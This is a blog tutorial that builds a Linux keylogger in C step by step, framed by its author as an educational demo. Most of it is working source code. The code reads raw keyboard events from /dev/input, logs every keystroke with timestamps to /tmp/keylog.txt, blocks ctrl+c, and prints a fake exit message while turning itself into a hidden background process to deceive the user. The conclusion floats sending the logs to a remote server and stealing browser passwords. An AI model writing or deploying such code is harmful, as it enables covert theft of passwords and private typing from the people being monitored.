---
title: Keylogger for Linux
date: 2021-02-02T14:47:26+05:30
tags:
  - linux
  - keylogger
  - C programming
draft: false
comments: false
---

> Developing a low level keylogger for linux using C.

<!--more-->

I am putting this blog in a bottom-up approach. We'll start with the basic program that can act as a keylogger.

### What is a Keylogger?? How to make one?

> Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.

We know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press *alt+tab* it changes the current focus to another application/screen.

According to wikipedia, in linux, the [event devices](https://en.wikipedia.org/wiki/Evdev) generalizes all the raw input from device drivers and makes them available through character devices in `/dev/input/` directory.

*(If you don't know about `character devices`, think it as a real-time stream data)*

All the event files/devices are located in `/dev/input/` directory. It was very easy to figure out the file after looking at the directory structure.

![directory-structure](https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png)

It is pretty obvious that my keyboard event file is `/dev/input/by-path/platform-i8042-serio-0-event-kbd`. (For you, this may change, but it'll have **kbd** in it's name!!)

So I wrote a program that will continuously read data from this file and print it on screen.

CODE - `basic_keylogger.c`
```
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  errno = 0;
  struct input_event ev;
  //This is the keyboard event file
  char* kbd_path = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }

  while (1)
  {
    read(fd, &ev, sizeof(struct input_event)); //read from keyboard
    printf("%i - %i\n",ev.code, ev.value);
  }

  return 0;
}
```

Compile this and run it.

```
## Compile

gcc basic_keylogger.c -o basic_keylogger.out

## Execute it

./basic_keylogger.out
```

This will give output something like this.

![output1](https://cdn-images-1.medium.com/max/640/1*Y-Z4wh_4BDSNLf6v1_NF8Q.png)

I am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever `ev.value` is `1` then I am getting a `ev.code` unique for each key. So I decided to just filter out the data with `ev.value == 1`.

CODE - `basic_keylogger.c` (minor modification)

```
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  errno = 0;
  struct input_event ev;
  //This is the keyboard event file
  char* kbd_path = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }

  while (1)
  {
    read(fd, &ev, sizeof(struct input_event)); //read from keyboard
    if(ev.value == 1)
    {
      printf("%i - %i\n",ev.code, ev.value);
    }
  }

  return 0;
}
```

After again compiling and running this, I was just getting the useful data from everything.

![useful-raw-data](https://cdn-images-1.medium.com/max/640/1*zRFTkTAQGKSMSspmAxqCjg.png)


This is the simple idea of making the keylogger. But there are a lot of things we haven't done.

### Making our keylogger more dynamic.

Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the **kbd** file in `/dev/input/by-path/` and then read that file for the events. And then save the events in a file.

For this purpose, I have changed the working directory structure to make the project more modular.

![](https://cdn-images-1.medium.com/max/640/1*2VyFdbneXRLZPXuScZGCPg.png)

CODE:- `basic_keylogger.c`

```
#include "basic_keylogger.h"


int main(void) {
  errno = 0;
  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }
  printf("Reading from %s\n",kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}

```

This main program *includes* `basic_keylogger.h` file - which I have used to include all the libraries and *define* macros.

CODE:- `basic_keylogger.h`

```

/*
//
// defining variables
//
*/

#define INPUT_EVENT_DIR "/dev/input/by-path/"
#define LOG_FILE "/tmp/keylog.txt"

/*
//
// importing system headers
//
*/

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/*
//
// importing utility functions
//
*/

#include "utils/logger.c"
#include "utils/helpers.c"
#include "utils/keyboard.c"
```

Here are 3 more files included for obvious purposes.

CODE:- `utils/logger.c` (logger function)

```
void log_in_file(struct input_event ev)
{
  printf("Logging");
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    FILE* fptr = fopen(LOG_FILE, "a");
    // print( [date time] keycode keyvalue ) - keyvalue => {press; lift; long press}
    fprintf(fptr, "[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
    if(tm.tm_sec == 0)
    {
      /* Do whatever you want to do here
        It is like a scheduler section.*/

      //fprintf(fptr, "%s\n", "1 minute check\n");
    }
    fclose(fptr);
    printf("  logged\n");
}
```

CODE:- `utils/helpers.c` (now only used for concatination of 2 strings)
```
char* concat(const char *s1, const char *s2)
{
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}
```

CODE:- `utils/keyboard.c` (get keyboard device from the directory)
```
char* get_me_a_keyboard()
{
  struct dirent **namelist;
  int n=0,i=0;
  n = scandir(INPUT_EVENT_DIR, &namelist, NULL, alphasort); // read the directory for the files
  if(n==-1)
  {
    // perror("Scandir Failed!!\n");
    exit(EXIT_FAILURE);
  }
  if(n<=2){
    // perror("No devices found!!\n");
    exit(EXIT_FAILURE);
  }
  // printf("[ * ] %d Devices found !!\n",n-2);
  for(i=0; i<n; i++)
    if( namelist[i]->d_name == "." || namelist[i]->d_name == "..") // skip for . and ..
      continue;
    else if(strstr(namelist[i]->d_name,"kbd")) // check if the filename has "kbd" (keyboard) in it
      break;  // if yes, do not look further

  return namelist[i]->d_name; // and return keyboard file name to caller function
}
```
After compiling and executing the binary. We get **logging - logged** message on the terminal and the actual log is being stored in `/tmp/keylog.txt` file - as mentioned in `basic_keylogger.h` file.

![](https://cdn-images-1.medium.com/max/640/1*ikK7hBwfMweto2rYqhaBFg.png)

![](https://cdn-images-1.medium.com/max/640/1*8wYAQGNMNS7TymthEnSb6g.png)

---

### What next? ...Getting evil!!

We can close the program by pressing *ctrl+c* or send it to background by *ctrl+z*. These key combinations send a signal to the process to close.
And we can handle these signals in our code.... using `signal.h` header file. (import this in the code.)

CODE - `basic_keylogger.c` (added signal handlers)

```
#include "basic_keylogger.h"

// Signal handler function
void signal_handler(int sig) {
  printf("Sorry, But I won't exit.\n");
}

int main(void) {
  errno = 0;

  struct sigaction signal; // create signal action struct
  signal.sa_handler = signal_handler; // initialize the handler function
  sigaction(SIGINT, &signal, NULL); // assign the signal action to a specific signal

  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }
  printf("Reading from %s\n",kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}
```

As expected with this code, I am unable to close the program with *ctrl+c*. Whenever I am pressing it, it gives me a message that **"Sorry, But I won't exit."**

![](https://cdn-images-1.medium.com/max/640/1*882rJMJZjAMEce-EupTVhg.png)

This program can only be terminated with **kill** signal. See [here](https://www.linux.com/training-tutorials/how-kill-process-command-line/) to know how.

![](https://cdn-images-1.medium.com/max/640/1*atvzfHlH5gEBaNw3PcoDgA.png)

### Going undercover

What if we trick user with a false closing message and go undercover [(Daemon process)](https://notes.shichao.io/apue/ch13/).

The idea is to create the process as a daemon process whenever the user press *ctrl+c*. Also give the user a good message so that he actually believes that the process has closed and then probably he'll not check for the running processes to find if it actually has closed.

To achieve this, I'll make slight changes to my `signal_handler` function and add a `daemonize` function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look [here](https://notes.shichao.io/apue/ch13/).

CODE:- `basic_keylogger.c` (changed the signal_handler function)

```
#include "basic_keylogger.h"


// Signal handler function
void signal_handler(int sig) {
  printf("Exiting very gracefully :)"); //fake message
  daemonize(); // Go undercover
}

int main(void) {
  errno = 0;

  struct sigaction signal; // create signal action struct
  signal.sa_handler = signal_handler; // initialize the handler function
  sigaction(SIGINT, &signal, NULL); // assign the signal action to a specific signal

  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Get keyboard name
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }
  printf("Reading from %s\n",kbd_path);
  free(kbd_path); // free some memory
  while (1)
  {
    read(fd, &ev, sizeof(struct input_event)); //read from keyboard
    if(ev.type == 1)
      log_in_file(ev); //log the event
  }
  return 0;
}
```

Here, I am using `daemonize` funtion which is defined in `./utils/daemonize.c` and imported in `basic_keylogger.h`.

CODE:- `daemonize.c`

```
int daemonize()
{
    pid_t pid, sid;

    /* Fork off the parent process */
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then
        we can exit the parent process. */
    if (pid > 0) { // Child can continue to run even after the parent has finished executing
        exit(EXIT_SUCCESS);
    }

    /* Change the file mode mask */
    umask(0);

    /* Open any logs here */

    /* Create a new SID for the child process */
    sid = setsid();
    if (sid < 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Change the current working directory */
    if ((chdir("/")) < 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Close out the standard file descriptors */
    //Because daemons generally dont interact directly with user so there is no need of keeping these open
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    return(pid);
}
```

After compiling and executing this code. We get a decent exit message like this.

![](https://cdn-images-1.medium.com/max/640/1*y_eJXDhm9j1vkrAzajJUEA.png)

But we can check from the **/tmp/keylog.txt** file that the program is still adding key events to the file. Use `tail -f /tmp/keylog.txt` command to check appending logs.

You can look for the process using `ps -A | grep 'your_binary_name'` command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using `kill -9 <processID>`.

---

### Conclusion.

You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do.
We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not.
Also with small modifications, I can send all the logs created locally to a remote server.

This program is only tested in a bare-metal linux system. This can't work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.

All this code is present in github repo here -> (https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger)
